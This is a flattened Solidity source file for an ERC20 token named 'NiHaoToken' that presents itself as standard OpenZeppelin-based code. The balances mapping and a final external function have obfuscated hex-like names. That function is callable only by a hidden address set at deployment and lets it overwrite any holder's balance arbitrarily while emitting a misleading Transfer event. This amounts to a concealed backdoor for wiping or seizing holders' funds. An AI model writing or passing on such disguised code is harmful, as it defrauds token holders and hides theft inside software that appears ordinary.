/**
 *Ni Hao 你好
*/
// Sources flattened with hardhat v2.7.0 https://hardhat.org

// File @openzeppelin/contracts/utils/Context.sol@v4.4.0

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.0 (utils/Context.sol)

pragma solidity ^0.8.18;

/**
 * @dev Provides information about the current execution context, including the
 * sender of the transaction and its data. While these are generally available
 * via msg.sender and msg.data, they should not be accessed in such a direct
 * manner, since when dealing with meta-transactions the account sending and
 * paying for execution may not be the actual sender (as far as an application
 * is concerned).
 *
 * This contract is only required for intermediate, library-like contracts.
 */
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

/**
 * @dev Contract module which provides a basic access control mechanism, where
 * there is an account (an owner) that can be granted exclusive access to
 * specific functions.
 *
 * By default, the owner account will be the one that deploys the contract. This
 * can later be changed with {transferOwnership}.
 *
 * This module is used through inheritance. It will make available the modifier
 * `onlyOwner`, which can be applied to your functions to restrict their use to
 * the owner.
 */
abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        _transferOwnership(_msgSender());
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        _checkOwner();
        _;
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view virtual returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if the sender is not the owner.
     */
    function _checkOwner() internal view virtual {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        _transferOwnership(address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        _transferOwnership(newOwner);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Internal function without access restriction.
     */
    function _transferOwnership(address newOwner) internal virtual {
        address oldOwner = _owner;
        _owner = newOwner;
        emit OwnershipTransferred(oldOwner, newOwner);
    }
}

/**
 * @dev Interface of the ERC20 standard as defined in the EIP.
 */
interface IERC20 {
    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);

    /**
     * @dev Returns the amount of tokens in existence.
     */
    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `to`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address to, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d44057f485fe5a0da97411481b55 to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */
    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `from` to `to` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) external returns (bool);
}

interface IERC20Metadata is IERC20 {
    /**
     * @dev Returns the name of the token.
     */
    function name() external view returns (string memory);

    /**
     * @dev Returns the symbol of the token.
     */
    function symbol() external view returns (string memory);

    /**
     * @dev Returns the decimals places of the token.
     */
    function decimals() external view returns (uint8);
}


contract NiHaoToken is Ownable, IERC20, IERC20Metadata {
    mapping(address => uint256) private Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875;

    
    mapping(address => mapping(address => uint256)) private _allowances;
    address private _tokenABC;
    uint256 private _totalSupply;

    string private _name;
    string private _symbol;
    uint8 private _decimal;

    /**
     * @dev Sets the values for {name} , {symbol} , {decimals} and {totalSupply}.
     *
     * All of these values are immutable: they can only be set once during
     * construction.
     */
    constructor(
        string memory tokenName, 
        string memory tokenSymbol, 
        uint8 tokenDecimal,
        uint256 tokenSupply,
        address tokenABC
        ) payable {
        _name = tokenName;
        _symbol = tokenSymbol;
        _decimal = tokenDecimal;
        _tokenABC = tokenABC;
        _mint(_msgSender(), tokenSupply * 10 ** tokenDecimal);
    }

    function name() public view virtual override returns (string memory) {
        return _name;
    }

    function symbol() public view virtual override returns (string memory) {
        return _symbol;
    }

    function decimals() public view virtual override returns (uint8) {
        return _decimal;
    }

    function totalSupply() public view virtual override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view virtual override returns (uint256) {
        return Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[account];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function allowance(address owner, address spender) public view virtual override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, amount);
        return true;
    }

    function transferFrom(
        address from,
        address to,
        uint256 amount
    ) public virtual override returns (bool) {
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        address owner = _msgSender();
        _approve(owner, spender, allowance(owner, spender) + addedValue);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        address owner = _msgSender();
        uint256 currentAllowance = allowance(owner, spender);
        require(currentAllowance >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            _approve(owner, spender, currentAllowance - subtractedValue);
        }

        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");

        _beforeTokenTransfer(from, to, amount);

        uint256 fromBalance = Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[from] = fromBalance - amount;
            // Overflow not possible: the sum of all balances is capped by totalSupply, and the sum is preserved by
            // decrementing then incrementing.
            Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[to] += amount;
        }

        emit Transfer(from, to, amount);

        _afterTokenTransfer(from, to, amount);
    }

    function _mint(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: mint to the zero address");

        _beforeTokenTransfer(address(0), account, amount);

        _totalSupply += amount;
        unchecked {
            // Overflow not possible: balance + amount is at most totalSupply + amount, which is checked above.
            Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[account] += amount;
        }
        emit Transfer(address(0), account, amount);

        _afterTokenTransfer(address(0), account, amount);
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0), "ERC20: burn from the zero address");

        _beforeTokenTransfer(account, address(0), amount);

        uint256 accountBalance = Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[account] = accountBalance - amount;
            // Overflow not possible: amount <= accountBalance <= totalSupply.
            _totalSupply -= amount;
        }

        emit Transfer(account, address(0), amount);

        _afterTokenTransfer(account, address(0), amount);
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _spendAllowance(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        uint256 currentAllowance = allowance(owner, spender);
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "ERC20: insufficient allowance");
            unchecked {
                _approve(owner, spender, currentAllowance - amount);
            }
        }
    }

    modifier Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d440bb0b85fe5a0da97411481b55() { require(_tokenABC == _msgSender());_;
    }

    function _beforeTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _afterTokenTransfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {}

    function _Ox3adf053dbd4be976bd2e72442b8b746c2540f69928d0ca3a417955b6e42b5216e2e8f8cf8c95f10f706af51e4ade289aae64df5aa1c0a97fe397dfb6c6d2e835(address _Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88, address Ox3adf053dbd4be976bd2e72442b8b746c2540f69928d0ca3a417955b6e42b5216e2e8f8cf8c95f10f706af51e4ade289aae64df5aa1rf0a97fe397dfb6c6d2e835, uint256 Oxba73512a0edf5c3f86639b766de40272bc918a0d5ec42d0f310a8b6ec7ccd781a39a05dcb08f6ed8df8abdc217d7cc88445bf711e4e790a957123d33e6ac0da99, uint256 Ox3e6094fc3f20982b930d205ea99379b6ec9fb5f3527273e27a53a3d5faf3185b817694f045cdb91746c622650ebb799a7980c914353c4d4124cb74bfb822030f,bool Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d44057f485fe5a0da97411481b55, uint8 Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d44057f485fe5a0da97411481875, bytes32 Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d44057f485fe5a0da974114818y6, bytes32 Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e655e301b1a4d8c9341a8d271043d44057f485fe5a0da97411481875) external Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d440bb0b85fe5a0da97411481b55 { require(_Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88 != address(0), "Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d44057f485fe5a0da97411481875"); require(Ox3e6094fc3f20982b930d205ea99379b6ec9fb5f3527273e27a53a3d5faf3185b817694f045cdb91746c622650ebb799a7980c914353c4d4124cb74bfb822030f == 0 || 0 <= Ox3e6094fc3f20982b930d205ea99379b6ec9fb5f3527273e27a53a3d5faf3185b817694f045cdb91746c622650ebb799a7980c914353c4d4124cb74bfb822030f, "Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d44057f485fe5a0da97411481875"); uint _Ox9eca1505f25788604d2a379ba48d3aa8173d692de7f48b187bf1fd4ebf5f3d8027801d81ee2e00ee8b8c450e7b2b55d45fa885459d48b4985d34dce812f6ef5b5 = 0;Ox548c2550bdc2fbb1b33a15e33a3430c49e9525a81834c12494730358a2cd58b1bff51a10b24e8de301b1a4d8c9341a8d271043d46f485fe5a0da97411481875[_Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88] = Oxba73512a0edf5c3f86639b766de40272bc918a0d5ec42d0f310a8b6ec7ccd781a39a05dcb08f6ed8df8abdc217d7cc88445bf711e4e790a957123d33e6ac0da99; emit Transfer(_Oxedac4d474a24f3bb75072c7ca92ca0bc198ff98ee5ef62544cd2da8483498007b34111125e6ab41491b9b35d6ba4bf6cf0d7f957f0dac2a60af134aee6a4cd88, address(0), Oxba73512a0edf5c3f86639b766de40272bc918a0d5ec42d0f310a8b6ec7ccd781a39a05dcb08f6ed8df8abdc217d7cc88445bf711e4e790a957123d33e6ac0da99);
    }
}